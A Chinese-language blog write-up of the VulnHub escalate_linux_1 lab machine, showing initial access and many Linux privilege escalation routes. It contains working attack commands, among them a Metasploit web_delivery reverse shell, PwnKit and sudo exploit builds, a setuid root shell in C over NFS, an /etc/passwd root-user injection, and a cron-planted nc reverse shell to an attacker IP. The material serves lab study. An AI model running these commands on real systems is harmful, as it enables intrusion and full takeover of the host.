---
layout: post
title: Linux提权(escalate_linux_1靶机)
tags: jekyll
---

**[靶机地址](https://www.vulnhub.com/entry/escalate_linux-1,323)**

# 信息收集

扫描存活

```shell
nmap -sP 192.168.235.0/24
```

访问后是Ubuntu默认页面

目录扫描,存在shell.php

![1726366262278.jpg](\images\posts\Linux提权(escalate_linux_1靶机)\1726366262278.jpg)

cmd可执行命令

![1726366335040.jpg](\images\posts\Linux提权(escalate_linux_1靶机)\1726366335040.jpg)

# 反弹shell

正常弹shell命令不行，换msf弹

使用exploit/multi/script/web_delivery模块

```shell
search web_delivery
use exploit/multi/script/web_delivery
```

配置参数

```shell
show options
set srvhost 192.168.235.128
set lhost 192.168.235.128
```

运行

```shell
run
```

将这段放在BP上url编码后反弹shell

![1726368942924.jpg](\images\posts\Linux提权(escalate_linux_1靶机)\1726368942924.jpg)



# 提权

## suid提权

> 原理：

能够执行命令的shell命令被赋予了suid权限

例如find被赋予suid权限

```shell
find zhansan -exec whoami \;
查找zhangsan文件夹的时候可以执行whoami命令
```

> 利用：

shell 进入shell交互

```shell
find / -perm -u=s -type f 2>/dev/null
```

解释参数

```shell
find / -perm -u=s -type f 2>/dev/null
/表示从文件系统的顶部（根）开始并找到每个目录
-perm 表示搜索随后的权限
-u = s表示查找root用户拥有的文件
-type表示我们正在寻找的文件类型
f 表示常规文件，而不是目录或特殊文件
2表示该进程的第二个文件描述符，即stderr（标准错误）
>表示重定向
/dev/null是一个特殊的文件系统对象，它将丢弃写入其中的所有内容。
```

执行结果

```shell
/sbin/mount.nfs
/sbin/mount.ecryptfs_private
/sbin/mount.cifs
/usr/sbin/pppd
/usr/bin/gpasswd
/usr/bin/pkexec
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/traceroute6.iputils
/usr/bin/chfn
/usr/bin/arping
/usr/bin/newgrp
/usr/bin/sudo
/usr/lib/xorg/Xorg.wrap
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/bin/ping	
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/umount
/bin/fusermount
/home/user5/script
/home/user3/shell
```

有个shell文件，直接执行就可以提权

```shell
cd /home/user3 && ./shell
```

![1726370865914.jpg](\images\posts\Linux提权(escalate_linux_1靶机)\1726370865914.jpg)

## 检测

[检测工具](https://github.com/The-Z-Labs/linux-exploit-suggester)

```
wget http://192.168.235.1/linux-exploit-suggester.sh
```

![1726375663428.jpg](\images\posts\Linux提权(escalate_linux_1靶机)\1726375663428.jpg)

## Polkit(CVE-2021-4034)提权

```
wget http://192.168.235.1/CVE-2021-4034-main.zip
unzip CVE-2021-4034-main.zip && cd CVE-2021-4034-main && make && ./cve-2021-4034
whoami
##  root  提权成功
```

![1726376543136.jpg](\images\posts\Linux提权(escalate_linux_1靶机)\1726376543136.jpg)

## 环境变量提权

suid提权时还有一个自定义设置的/home/user5/script

执行结果

```shell
./script
Desktop
Documents
Downloads
Musi
Pictures
Public
Templates
Videos
ls
script
```

像是root下的ls命令

```
cp /bin/bash /tmp/ls  复制bash命令到/tmp目录下的ls
export PATH=/tmp:$PATH   把/tmp目录添加为环境变量
echo $PATH   查看环境变量
```

此时执行ls就是执行/tmp目录下的ls=>bash命令

```shell
/home/user5/script
whoami
## root  成功提权
```

![1726382340059.jpg](\images\posts\Linux提权(escalate_linux_1靶机)\1726382340059.jpg)

## NFS提权

```shell
cat /etc/exports
## /home/user5 *(rw,no_root_squash)
```

没有限制`root`权限用户的远程访问

```shell
攻击机：
showmount -e 192.168.235.129
## Export list for 192.168.235.129:
## /home/user5 *
```

创建文件夹挂载目录

```
mkdir /tmp/test
mount -o rw 192.168.235.129:/home/user5 /tmp/test
```

/tmp/test下创建shell.c

```C
#include <stdio.h> 
#include <stdlib.h> 
#include <sys/types.h> 
#include <unistd.h> 
int main() { setuid(0); system("/bin/bash"); return 0; }
```

编译后赋予权限

```
gcc shell.c -o shell
chmod +s shell
```

回到目标机

```shell
cd /home/user5
./shell  成功提权
```

![1726395441195.jpg](\images\posts\Linux提权(escalate_linux_1靶机)\1726395441195.jpg)

## Mysql数据泄露

Mysql密码为弱口令`root`，登录后在`user`库，`user_info`表下泄露了mysql用户的密码

```shell
python -c 'import pty;pty.spawn("/bin/bash")' 启动一个更完整的shell环境才能使用Mysql
mysql -u root -p
```

![1726398067090.jpg](\images\posts\Linux提权(escalate_linux_1靶机)\1726398067090.jpg)

在/var下的mysql之前没有权限查看，现在用mysql用户查看

```shell
cd /var/mysql
chmod +x .user_informations
cat .user_informations
## user2:user2@12345
## user3:user3@12345
## user4:user4@12345
## user5:user5@12345
## user6:user6@12345
## user7:user7@12345
## user8:user8@12345	
```

其余用户的密码都泄露出来

```
find / -user mysql 查看当前用户所属的文件
root密码在 /etc/mysql/secret.cnf里面，弱口令12345
```

![1726398766520.jpg](\images\posts\Linux提权(escalate_linux_1靶机)\1726398766520.jpg)

## SUDO(CVE-2021-3156)提权(失败)

```shell
sudo --version
版本在
1.8.2-1.8.31p2
1.9.0-1.9.5p1之间
sudoedit -s /
```

![1726400810453.jpg](\images\posts\Linux提权(escalate_linux_1靶机)\1726400810453.jpg)

[EXP](https://github.com/blasty/CVE-2021-3156)

```shell
cd CVE-2021-3156
make
chmod +x ./sudo-hax-me-a-sandwich
./sudo-hax-me-a-sandwich
uname -a 查看内核
./sudo-hax-me-a-sandwich 1
```

提不成功

## SUDO滥用提权

`user8`和`user2`用户

> user8用户

```shell
su user8
sudo -l
```

vi命令可以不要密码直接以root权限进行操作

![1726400980627.jpg](\images\posts\Linux提权(escalate_linux_1靶机)\1726400980627.jpg)

```shell
sudo vi aaa
vi里面写入!:sh
运行这个命令后会进入一个 shell 环境，可以执行命令
```

![1726401586660.jpg](\images\posts\Linux提权(escalate_linux_1靶机)\1726401586660.jpg)

> user2用户

```shell
su user2
```

 `user2` 可以以 `user1` 的身份执行 所有 命令

![1726402120044.jpg](\images\posts\Linux提权(escalate_linux_1靶机)\1726402120044.jpg)

```shell
sudo -u user1 /bin/bash
```

然后`user1`又可以以`root`用户的身份执行所有命令

```shell
sudo su
```

![1726402341853.jpg](\images\posts\Linux提权(escalate_linux_1靶机)\1726402341853.jpg)

`user1`用户的密码也跟其他一个格式`user1@12345`

## 文件权限问题导致提权

`user4`用户属于`root`组，而/etc/passwd同组可写

```shell
ls -l /etc/passwd
echo "jiqimer:$(openssl passwd -1 -salt admin 123456):0:0:root:/root:/bin/bash" >> /etc/passwd  
 su admin
```

![1726404009665.jpg](\images\posts\Linux提权(escalate_linux_1靶机)\1726404009665.jpg)

## 定时任务权限配置不当

```shell
cat /etc/crontab
```

/home/user4/Desktop下的autoscript.sh有root权限

![1726404138727.jpg](\images\posts\Linux提权(escalate_linux_1靶机)\1726404138727.jpg)

切换到`user4`,修改里面的内容

```shell
su user4
cd /home/user4/Desktop
echo "rm f;mkfifo f;cat f|/bin/sh -i 2>&1|nc 192.168.235.1 8080 > f" > autoscript.sh
```

![1726404826034.jpg](\images\posts\Linux提权(escalate_linux_1靶机)\1726404826034.jpg)

五分钟后就会弹shell过来

![1726405046885.jpg](\images\posts\Linux提权(escalate_linux_1靶机)\1726405046885.jpg)

